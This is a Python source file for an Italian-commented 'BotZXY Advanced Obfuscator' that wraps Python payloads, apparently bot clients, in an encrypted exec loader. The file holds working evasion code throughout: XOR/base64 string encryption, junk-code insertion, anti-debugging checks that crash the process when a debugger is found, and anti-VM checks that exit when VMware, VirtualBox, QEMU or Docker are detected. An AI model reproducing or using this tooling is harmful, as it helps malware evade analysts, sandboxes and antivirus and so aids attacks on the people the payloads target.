#!/usr/bin/env python3
# BotZXY Advanced Obfuscator v2.0
# Offusca completamente i payload per Windows, Android e iOS

import os
import sys
import base64
import random
import string
import hashlib
import zlib
import re
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class BotZXYObfuscator:
    def __init__(self):
        self.key = self._generate_key()
        self.fernet = Fernet(self.key)
        
    def _generate_key(self):
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(b"BotZXY_Super_Secret_Key_2026"))
        return key
    
    def _generate_anti_debug(self):
        return '''
# ============ ANTI-DEBUG ============
import ctypes, sys, os, time, threading

def check_debugger():
    try:
        if os.name == 'nt':
            import win32api
            if win32api.IsDebuggerPresent():
                return True
            kernel32 = ctypes.windll.kernel32
            if kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool())):
                return True
        start = time.time()
        for _ in range(1000000):
            pass
        if time.time() - start < 0.01:
            return True
        return False
    except:
        return False

def anti_debug_loop():
    while True:
        if check_debugger():
            try:
                ctypes.windll.kernel32.RaiseException(0x80000000, 0, 0, None)
            except:
                os._exit(1)
        time.sleep(1)

threading.Thread(target=anti_debug_loop, daemon=True).start()
'''
    
    def _generate_anti_vm(self):
        return '''
# ============ ANTI-VM ============
import subprocess, re, time, threading

def check_vm():
    vm_indicators = ['VMware', 'VirtualBox', 'VBox', 'QEMU', 'KVM', 'Xen', 'vbox', 'qemu', 'hyper-v', 'docker']
    try:
        if os.name == 'nt':
            processes = subprocess.check_output('tasklist', shell=True).decode().lower()
            for indicator in vm_indicators:
                if indicator.lower() in processes:
                    return True
        else:
            processes = subprocess.check_output('ps aux', shell=True).decode().lower()
            for indicator in vm_indicators:
                if indicator.lower() in processes:
                    return True
    except:
        pass
    try:
        if os.name == 'nt':
            import wmi
            c = wmi.WMI()
            for item in c.Win32_ComputerSystem():
                if item.Manufacturer and ('VMware' in item.Manufacturer or 'VirtualBox' in item.Manufacturer):
                    return True
    except:
        pass
    return False

def anti_vm_loop():
    while True:
        if check_vm():
            os._exit(1)
        time.sleep(5)

threading.Thread(target=anti_vm_loop, daemon=True).start()
'''
    
    def _obfuscate_strings(self, code):
        """Offusca tutte le stringhe con XOR + Base64"""
        import re
        
        def encrypt_match(match):
            s = match.group(0)
            if len(s) <= 3:
                return s
            if s.startswith('"') and s.endswith('"'):
                s = s[1:-1]
            elif s.startswith("'") and s.endswith("'"):
                s = s[1:-1]
            else:
                return match.group(0)
            
            key = random.randint(1, 255)
            encrypted = bytes([ord(c) ^ key for c in s])
            encoded = base64.b64encode(encrypted).decode()
            return f"__dec('{encoded}', {key})"
        
        string_pattern = r'"([^"\\]*(\\.[^"\\]*)*)"|\'([^\'\\]*(\\.[^\'\\]*)*)\''
        
        decrypt_func = '''
def __dec(s, k):
    try:
        import base64
        d = base64.b64decode(s)
        return ''.join(chr(b ^ k) for b in d)
    except:
        return s
'''
        code = decrypt_func + '\n' + code
        code = re.sub(string_pattern, encrypt_match, code)
        return code
    
    def _add_junk_code(self, code):
        """Aggiunge codice spazzatura (commenti sicuri + defs inutili a livello modulo)"""
        junk_templates = [
            "def _j{}(x): return x ^ random.randint(1,255)\n",
            "class _C{}:\n    def __init__(self): self.x = random.random()\n",
            "def _u{}(a,b): return (a*b) % 7\n",
        ]
        junk = ""
        for i in range(15):
            junk += junk_templates[i % len(junk_templates)].format(random.randint(1000, 9999))

        lines = code.split('\n')
        for _ in range(5):
            pos = random.randint(0, len(lines))
            lines.insert(pos, f"# {''.join(random.choices(string.ascii_letters, k=30))}")

        return junk + "\n" + "\n".join(lines)
    
    def _encrypt_code(self, code):
        """Cripta l'intero codice e crea un loader"""
        compressed = zlib.compress(code.encode('utf-8'))
        compressed_b64 = base64.b64encode(compressed).decode()
        
        loader = f'''
import zlib, base64, marshal, sys, os, random, time, threading, ctypes

# Anti-debug
{self._generate_anti_debug()}

# Anti-VM
{self._generate_anti_vm()}

# Esegue il payload offuscato
exec(zlib.decompress(base64.b64decode("""{compressed_b64}""")))
'''
        return loader
    
    def obfuscate(self, code):
        """Applica tutte le tecniche di offuscamento"""
        print("[+] Offuscamento in corso...")
        print("[+] Offuscamento stringhe...")
        code = self._obfuscate_strings(code)
        print("[+] Aggiunta junk code...")
        code = self._add_junk_code(code)
        print("[+] Criptatura codice...")
        code = self._encrypt_code(code)
        print("[+] Offuscamento completato!")
        return code
    
    def obfuscate_file(self, input_file, output_file):
        """Offusca un file Python"""
        print(f"\n[+] Caricamento: {input_file}")
        
        with open(input_file, 'r', encoding='utf-8') as f:
            code = f.read()
        
        obfuscated = self.obfuscate(code)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(obfuscated)
        
        print(f"\n[+] Offuscato salvato: {output_file}")
        
        original_size = os.path.getsize(input_file) / 1024
        obfuscated_size = os.path.getsize(output_file) / 1024
        print(f"[+] Originale: {original_size:.2f} KB")
        print(f"[+] Offuscato: {obfuscated_size:.2f} KB")
        print(f"[+] Ratio: {obfuscated_size/original_size:.2f}x")

def main():
    print("""
╔═══════════════════════════════════════════════════════════╗
║                                                          ║
║     ██████╗ ██████╗ ███████╗██╗   ██╗███████╗██████╗   ║
║    ██╔═══╝ ██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗  ║
║    ██║     ██████╔╝█████╗  ██║   ██║███████╗██████╔╝  ║
║    ██║     ██╔══██╗██╔══╝  ██║   ██║╚════██║██╔══██╗  ║
║    ╚██████╗██║  ██║██║     ╚██████╔╝███████║██║  ██║  ║
║     ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║
║                                                          ║
║              BOTZXY ADVANCED OBFUSCATOR                  ║
║                    v2.0 - ULTRA MODE                    ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) < 2:
        print("USO: python obfuscator.py <file_input> [file_output]")
        print("")
        print("ESEMPIO:")
        print("  python obfuscator.py payloads/windows_client.py payloads/windows_client_obf.py")
        print("")
        print("SE NESSUN OUTPUT SPECIFICATO, viene creato automaticamente:")
        print("  payloads/windows_client_obf.py")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else input_file.replace('.py', '_obf.py')
    
    if not os.path.exists(input_file):
        print(f"[ERRORE] File non trovato: {input_file}")
        sys.exit(1)
    
    obf = BotZXYObfuscator()
    obf.obfuscate_file(input_file, output_file)
    
    print("\n[✅] OFUSCAMENTO COMPLETATO CON SUCCESSO!")

if __name__ == "__main__":
    main()